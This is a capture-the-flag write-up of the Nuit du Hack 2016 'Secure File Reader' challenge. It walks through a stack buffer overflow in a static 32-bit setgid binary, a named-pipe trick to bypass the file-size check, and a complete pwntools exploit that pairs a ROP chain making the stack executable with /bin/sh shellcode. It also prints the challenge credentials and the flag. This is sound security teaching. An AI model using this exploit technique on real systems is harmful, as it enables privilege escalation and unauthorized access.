---
layout: post
title:  "Nuit du Hack Quals 2016: Secure File Reader"
author: f0rki
categories: writeup
tags: [cat/pwning, tool/radare, tool/binjitsu, cat/binary]
---

* **Category:** Exploit Me
* **Points:** 200
* **Description:**

> Hi, I have secured my file reader so that you won't be able to pwn it. You
> know, I have pretty good skills in security.
>
> Don't even try to beat me!
>
> The challenge is available at securefilereader.quals.nuitduhack.com:55552
> (chall:chall)



# Write-up

We have ssh access and in the home folder is a setgid binary `pwn` and a
`flag` file, with the same group owner as `pwn`. Obviously the goal is to read
the flag file, by exploiting `pwn`.

So let's download `pwn` and develop the exploit locally first. Fire up radare
first to check what the binary is doing.

```
[0x08048f4f]> iI
pic      false
canary   false
nx       true
[...]
arch     x86
bits     32
[...]
stripped false
static   true
[...]
```

So the only protection mechanism enabled is `NX` and the binary is statically
linked. Keep that in mind.

The binary isn't big (ignoring the statically linked libc). It reads a file and
stores it in a buffer on the stack and exits Unfortunately it calls the
function `sym.check_size` first, which calls `stat` and checks if the filesize
is smaller than `0xfff`. Let's see if we can trick this function. My first
guess was to use `mkfifo`. Getting the size of pipes doesn't make sense so it
will probably be 0.

```
$ mkfifo fifo; strace ./pwn ./fifo & python -c 'print("A"*0x1200)' > ./fifo; rm ./fifo
[1] 5437
execve("./pwn", ["./pwn", "./fifo"], [/* 35 vars */]) = 0
strace: [ Process PID=5440 runs in 32 bit mode. ]
uname({sysname="Linux", nodename="pwn", ...}) = 0
brk(NULL)                               = 0x9f14000
brk(0x9f14d40)                          = 0x9f14d40
set_thread_area({entry_number:-1, base_addr:0x9f14840, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
readlink("/proc/self/exe", "/ctf/ndhquals2016/secure_file_re"..., 4096) = 44
brk(0x9f35d40)                          = 0x9f35d40
brk(0x9f36000)                          = 0x9f36000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
stat64("./fifo", {st_mode=S_IFIFO|0644, st_size=0, ...}) = 0
open("./fifo", O_RDONLY)                = 3
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 256) = 256
read(3, "\n", 256)                      = 1
read(3, "", 256)                        = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7758000
write(1, "The file has been saved successf"..., 37%                                                                                                                           The file has been saved successfully
) = 37
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x41414141} ---
+++ killed by SIGSEGV (core dumped) +++
[1]  + 5437 segmentation fault (core dumped)  strace ./pwn ./fifo
```

yes :) We are dealing with a classic stack based buffer overflow. Now let's
find the offset of the return address. I launched the program in the debugger
and used the `cyclic` tool of `binjitsu` to generate a pattern, which we can
look up later to determine the offset to the return address.

```
gdb-peda$ ! rm ./fifo; mkfifo ./fifo
gdb-peda$ r ./fifo
Starting program: ./pwn ./fifo
The file has been saved successfully

Program received signal SIGSEGV, Segmentation fault.

[...]
gdb-peda$ print $eip
$3 = (void (*)()) 0x61687062
```

and in another terminal

```
$ cyclic -c i386 4600 > ./fifo
$ cyclic -c i386 -l 0x61687062
4124
```

Now let's create a working exploit. Let's see if the binary contains something
interesting we can jump to:

```
[0x08048d2a]> afl~system
[0x08048d2a]> afl~exec
0x0809e580  88    6     sym._dl_make_stack_executable
0x080bc800  315   18    sym.execute_cfa_program
0x080bd940  100   3     sym.execute_stack_op
```

OK so apparently because the program doesn't use any of the system or exec
functions, the linker threw them away. No luck there. But this
`_dl_make_stack_executable` functions seems useful. A quick search revealed the
following blog post on the radare blog:
[Defeating baby_rop with radare2](http://radare.today/posts/defeating-baby_rop-with-radare2/)

The setting is basically the same. Statically linked binary with no interesting
functions in the binary. We could ROP our way to the `execve` syscall manually,
but that seems tedious. I adapted the exploit from the blog post.

 1. call `_dl_make_stack_executable`
 2. jump to payload with `call esp` gadget.
 3. get shell

Here is the final exploit

```python
#!/usr/bin/env python

from pwn import *  # NOQA
import subprocess

context.log_level = 'debug'
context.arch = 'i386'

vbin = "./pwn"
s = None


def connect():
    global s
    s = ssh(host="securefilereader.quals.nuitduhack.com",
            user="chall",
            password="chall",
            port=55552)


if not os.path.exists(vbin):
    if not s:
        connect()
    s.download_file("~/pwn")
    subprocess.check_call(["chmod", "+x", "./pwn"])

velf = ELF("./pwn")

# > afl~exec
# 0x0809e580  88    6     sym._dl_make_stack_executable
#
# can we use this to bypass NX?
# http://radare.today/posts/defeating-baby_rop-with-radare2/
#

# The payload is gonna look like this:
# [ padding ][ ROP chain ][ shellcode ]

padsize = 4124
pad = "A" * padsize

r = ROP(velf)
r.raw(0x0807270a)  # pop edx ; ret
r.raw(0x080edfec)  # obj.__stack_prot
r.raw(0x080beb26)  # pop eax; ret
r.raw(0xffffffff)  # -1
for i in range(8):
    r.raw(0x0807f15f)  # inc eax ; ret

r.raw(0x0809dead)  # mov dword ptr [edx], eax ; ret
r.raw(0x080beb26)  # pop eax; ret
r.raw(0x080edfc4)  # obj.__libc_stack_end
r.call('_dl_make_stack_executable')
r.raw(0x0808d330)  # call esp

# r.call('exit', [42])
log.info("Using rop chain:\n" + r.dump()
         + "\n")  # + hexdump(str(r)))


sc = shellcraft.i386.linux.sh()
log.info("using shellode:\n" + sc)
sc = asm(sc)
log.info("assembled length: {}".format(len(sc)))


payload = str(r) + sc + "\x90" * 4
log.info(hexdump(payload))
payload = pad + payload

if "\x00" in payload:
    log.warn("NULL byte in payload!")

log.info("saving payload")
with open("./payload", "w") as f:
    f.write(payload)

# :)

subprocess.check_call(["mkfifo", "./fifo"])

vp = process(["./pwn", "./fifo"])
# break *0x8048f4e
# gdb.attach(vp)

with open("./fifo", "w") as f:
    f.write(payload)

vp.interactive()

log.info("removing fifo ")
subprocess.check_call(["rm", "./fifo"])
```

Using this we get a shell. On the challenge ssh server:

```
chall@e39e5ded74c2:/tmp/tmp.dzF4rbAhky$ ls
fifo  payload
chall@e39e5ded74c2:/tmp/tmp.dzF4rbAhky$ ~/pwn ./fifo &
[1] 11429
chall@e39e5ded74c2:/tmp/tmp.dzF4rbAhky$ cat payload > fifo
The file has been saved successfully
chall@e39e5ded74c2:/tmp/tmp.dzF4rbAhky$ fg
~/pwn ./fifo
$ ls
fifo  payload
$ cd /home/chall
$ ls
flag  pwn
$ cat flag
rUN!RuN$RUn!Y0U$W1N_TH3_R4c3
```
